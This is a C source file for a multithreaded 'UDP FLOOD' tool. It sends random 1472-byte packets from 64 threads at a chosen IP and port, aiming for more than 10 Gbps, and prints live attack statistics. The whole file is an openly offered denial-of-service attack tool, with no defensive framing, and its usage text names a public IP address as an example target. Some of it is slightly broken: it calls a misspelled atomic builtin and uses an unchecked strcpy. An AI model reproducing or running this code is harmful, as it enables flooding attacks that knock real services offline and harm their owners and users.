#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>

#define PACKET_SIZE 1472
#define THREAD_COUNT 64
#define BATCH_SIZE 128

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int thread_id;
    uint64_t packets_sent;
    uint64_t bytes_sent;
} thread_data_t;

volatile int running = 1;
volatile uint64_t total_packets = 0;
volatile uint64_t total_bytes = 0;
time_t start_time;

void signal_handler(int sig) {
    running = 0;
    printf("\nStopping attack...\n");
}

void* stats_thread(void* arg) {
    uint64_t last_packets = 0;
    uint64_t last_bytes = 0;
    time_t last_time = time(NULL);
    
    printf("\n[STATS] Starting monitoring... Target: 10+ Gbps\n");
    printf("[STATS] Threads: %d | Packet Size: %d | Batch Size: %d\n\n", 
           THREAD_COUNT, PACKET_SIZE, BATCH_SIZE);
    
    while (running) {
        sleep(1);
        time_t current_time = time(NULL);
        uint64_t current_packets = total_packets;
        uint64_t current_bytes = total_bytes;
        
        double elapsed = difftime(current_time, last_time);
        if (elapsed > 0) {
            double pps = (current_packets - last_packets) / elapsed;
            double gbps = ((current_bytes - last_bytes) * 8.0) / (elapsed * 1000000000);
            double total_gb = (double)current_bytes / (1024*1024*1024);
            double total_elapsed = difftime(current_time, start_time);
            
            printf("\r[STATS] Time: %03.0fs | PPS: %8.0f | Gbps: %6.2f | Total: %5.1f GB", 
                   total_elapsed, pps, gbps, total_gb);
            fflush(stdout);
            
            if (gbps < 8.0 && total_elapsed > 5) {
                printf("  [WARNING] Below 10 Gbps target!");
            }
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    printf("\n");
    return NULL;
}

void* flood_thread(void* arg) {
    thread_data_t* data = (thread_data_t*)arg;
    
    // Create socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    // MAXIMUM performance settings
    int sendbuf = 4 * 1024 * 1024; // 4MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
    
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    // Non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    // Setup target
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &dest_addr.sin_addr);
    
    // Pre-generate random payloads for this thread
    char** payloads = malloc(BATCH_SIZE * sizeof(char*));
    FILE* urandom = fopen("/dev/urandom", "rb");
    for (int i = 0; i < BATCH_SIZE; i++) {
        payloads[i] = malloc(PACKET_SIZE);
        if (urandom) {
            fread(payloads[i], 1, PACKET_SIZE, urandom);
        } else {
            memset(payloads[i], i % 256, PACKET_SIZE); // Fallback pattern
        }
    }
    if (urandom) fclose(urandom);
    
    time_t end_time = time(NULL) + data->duration;
    uint64_t local_packets = 0;
    uint64_t local_bytes = 0;
    int payload_index = 0;
    
    printf("Thread %d started -> %s:%d\n", data->thread_id, data->target_ip, data->target_port);
    
    // MAIN FLOOD LOOP - OPTIMIZED
    while (running && time(NULL) < end_time) {
        for (int batch = 0; batch < 50; batch++) { // Multiple batches per iteration
            for (int i = 0; i < BATCH_SIZE; i++) {
                ssize_t sent = sendto(sock, payloads[payload_index], PACKET_SIZE, MSG_DONTWAIT,
                                    (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                
                if (sent > 0) {
                    local_packets++;
                    local_bytes += sent;
                }
                
                payload_index = (payload_index + 1) % BATCH_SIZE;
            }
        }
        
        // Update global counters
        if (local_packets > 5000) {
            __sync_fetch_add(&total_packets, local_packets);
            __sync_fetch_add(&total_bytes, local_bytes);
            local_packets = 0;
            local_bytes = 0;
        }
    }
    
    // Final update
    __sync_fetch_add(&total_packets, local_packets);
    __sync_fetch_add(&total_bytes, local_bytes);
    
    // Cleanup
    for (int i = 0; i < BATCH_SIZE; i++) {
        free(payloads[i]);
    }
    free(payloads);
    close(sock);
    
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("🔥 HIGH-PERFORMANCE UDP FLOOD TOOL 🔥\n");
        printf("Usage: %s <IP> <PORT> <DURATION>\n\n", argv[0]);
        printf("Example: %s 89.187.177.114 80 60\n", argv[0]);
        printf("         %s 192.168.1.100 443 30\n", argv[0]);
        return 1;
    }
    
    char target_ip[16];
    strcpy(target_ip, argv[1]);
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    printf("🚀 Starting UDP FLOOD Attack:\n");
    printf("   Target: %s:%d\n", target_ip, target_port);
    printf("   Duration: %d seconds\n", duration);
    printf("   Configuration: %d threads, %d bytes/packet\n", THREAD_COUNT, PACKET_SIZE);
    printf("   Expected: 10+ Gbps constant traffic\n\n");
    
    signal(SIGINT, signal_handler);
    start_time = time(NULL);
    
    pthread_t threads[THREAD_COUNT];
    pthread_t stats_tid;
    thread_data_t* thread_data[THREAD_COUNT];
    
    // Start stats thread
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Start ALL flood threads
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_data[i] = malloc(sizeof(thread_data_t));
        strcpy(thread_data[i]->target_ip, target_ip);
        thread_data[i]->target_port = target_port;
        thread_data[i]->duration = duration;
        thread_data[i]->thread_id = i;
        thread_data[i]->packets_sent = 0;
        thread_data[i]->bytes_sent = 0;
        
        if (pthread_create(&threads[i], NULL, flood_thread, thread_data[i]) != 0) {
            perror("pthread_create");
            free(thread_data[i]);
        }
        
        usleep(10000); // Small delay between thread starts
    }
    
    printf("All %d attack threads launched!\n", THREAD_COUNT);
    
    // Wait for completion
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
        free(thread_data[i]);
    }
    
    running = 0;
    pthread_join(stats_tid, NULL);
    
    double total_seconds = difftime(time(NULL), start_time);
    printf("\n\n🔥 ATTACK COMPLETED:\n");
    printf("   Total Packets: %lu\n", total_packets);
    printf("   Total Bytes: %.2f GB\n", (double)total_bytes / (1024*1024*1024));
    printf("   Average Gbps: %.2f\n", (total_bytes * 8.0) / (total_seconds * 1000000000));
    printf("   Duration: %.1f seconds\n", total_seconds);
    
    return 0;
}
